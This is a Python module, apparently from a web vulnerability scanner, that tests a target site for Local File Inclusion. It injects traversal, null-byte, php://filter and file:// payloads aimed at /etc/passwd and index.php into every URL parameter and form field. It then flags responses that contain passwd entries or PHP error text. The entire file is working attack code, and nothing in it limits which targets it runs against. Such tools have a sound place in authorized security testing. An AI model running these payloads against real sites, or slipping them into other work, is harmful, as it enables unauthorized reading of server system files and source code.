# modules/lfi.py
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "../../../../etc/passwd%00",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd"
]

def scan_lfi(session, url, forms, logger, tech):
    """Scan for Local File Inclusion vulnerabilities"""
    findings = []
    
    # Test URL parameters
    if "?" in url:
        param_findings = test_url_parameters_lfi(session, url, logger)
        findings.extend(param_findings)
    
    # Test form inputs
    if forms:
        for form in forms:
            form_findings = test_form_inputs_lfi(session, url, form, logger)
            findings.extend(form_findings)
    
    return findings

def test_url_parameters_lfi(session, url, logger):
    """Test URL parameters for LFI"""
    findings = []
    
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return findings
        
        for param_name in params.keys():
            for payload in LFI_PAYLOADS:
                try:
                    test_url = inject_param_lfi(url, param_name, payload)
                    r = session.get(test_url, timeout=10)
                    
                    if check_lfi_success(r.text):
                        logger.debug(f"LFI detected in parameter {param_name}")
                        findings.append({
                            "type": "Local File Inclusion",
                            "severity": "High",
                            "payload": payload,
                            "parameter": param_name,
                            "response": r,
                            "confirmed": True,
                            "evidence": "File content detected in response"
                        })
                        break
                        
                except Exception as e:
                    logger.debug(f"Error testing LFI: {e}")
    
    except Exception as e:
        logger.debug(f"Error in URL LFI test: {e}")
    
    return findings

def test_form_inputs_lfi(session, url, form, logger):
    """Test form inputs for LFI"""
    findings = []
    
    try:
        if not form or not isinstance(form, dict):
            return findings
        
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.get("inputs", [])
        
        if not inputs:
            return findings
        
        target = urljoin(url, action) if action else url
        
        for input_field in inputs:
            if isinstance(input_field, dict):
                input_name = input_field.get("name")
                input_type = input_field.get("type", "text")
                if input_type in ["submit", "button", "image"]:
                    continue
            else:
                input_name = input_field
            
            if not input_name:
                continue
            
            for payload in LFI_PAYLOADS:
                try:
                    data = {input_name: payload}
                    
                    if method == "post":
                        r = session.post(target, data=data, timeout=10)
                    else:
                        r = session.get(target, params=data, timeout=10)
                    
                    if check_lfi_success(r.text):
                        findings.append({
                            "type": "Local File Inclusion",
                            "severity": "High",
                            "payload": payload,
                            "parameter": input_name,
                            "location": "form",
                            "response": r,
                            "confirmed": True
                        })
                        break
                        
                except Exception as e:
                    logger.debug(f"Error testing form LFI: {e}")
    
    except Exception as e:
        logger.debug(f"Error in form LFI test: {e}")
    
    return findings

def check_lfi_success(response_text):
    """Check if LFI was successful"""
    if not response_text:
        return False
    
    indicators = [
        "root:x:0:0:",
        "daemon:x:1:1:",
        "bin:x:2:2:",
        "[extensions]",
        "<?php",
        "Unable to open file",
        "failed to open stream"
    ]
    
    response_lower = response_text.lower()
    for indicator in indicators:
        if indicator.lower() in response_lower:
            return True
    return False

def inject_param_lfi(url, param_name, payload):
    """Inject payload into URL parameter for LFI testing"""
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
    except:
        return url
